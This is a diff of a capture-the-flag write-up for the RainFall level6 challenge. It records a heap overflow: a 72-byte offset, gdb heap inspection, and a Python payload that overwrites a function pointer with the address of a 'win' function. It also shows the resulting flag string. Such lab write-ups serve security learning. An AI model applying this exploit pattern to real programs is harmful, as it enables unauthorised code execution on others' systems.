@@ -1,19 +1,18 @@
-Okay this looks like a buffer overflow
+Okay this looks like a buffer heap overflow
 
-I calculated the offset: 72
 
 Here is the address of function n (win) : `0x08048454` == `\x54\x84\x04\x08`
 
-Here is the adress of function m (lose) : `0x8048468` == 
+Here is the adress of function m (lose) : `0x8048468`
 
-
-(python -c 'print ("A" * 64 + )';cat) | ./level5
 
 ```
-heap info proc map
+info proc map
 
 0x804a000  0x806b000    0x21000        0x0 [heap]
 ```
+
+tart of heap `0x804a000`
 
 ```console
 (gdb) x/50x 0x804a000
@@ -33,12 +32,19 @@ heap info proc map
 ```
 
 18 x 4 = 72
+I calculated the offset: 72
+address of m is located 72 bytes after our mallocated buffer  
 
+Lets overwrite value the function ptr with address of function n
 
-(python -c 'print ("A" *(72) + "\x54\x84\x04\x08" )';cat) | ./level6
-(python -c 'print ("A" *(4 * 17) + "\x54\x84\x04\x08" )';cat) | ./level6
+```
+./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08"*12 )')`
+```
 
+```
+```console
+./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08"*12 )')`
+level6@RainFall:~$ ./level6 `(python -c 'print ("A" * 72 + "\x54\x84\x04\x08"*12 )')`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
-`(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB`
-
-run <(python -c 'print ("A" * 72 + "\x54\x84\x04\x08")';) | ./level6
+```
